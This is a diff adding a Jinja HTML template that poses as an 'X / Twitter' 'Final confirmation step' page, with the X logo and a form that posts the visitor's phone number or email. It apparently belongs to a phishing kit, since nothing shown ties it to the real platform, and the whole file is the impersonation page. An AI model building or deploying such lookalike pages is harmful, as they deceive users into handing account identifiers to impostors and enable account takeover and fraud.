@@ -1,1 +1,20 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;border-radius:16px;box-shadow:0 6px 18px rgba(29,161,242,0.25);">
+<div class="platform-header">
+<div class="icon-circle bg-twitter">
+<i class="fa-brands fa-x-twitter icon-lg"></i>
+</div>
+<div>
+<h2 style="margin:0;color:#000;">X / Twitter</h2>
+<div style="color:#64748b;font-size:13px">Final confirmation step.</div>
+</div>
+</div>
 
+
+<form method="post">
+<input class="input" placeholder="Confirm Phone or Email" name="confirm">
+<button class="btn login-btn">Continue</button>
+</form>
+</div>
+{% endblock %}
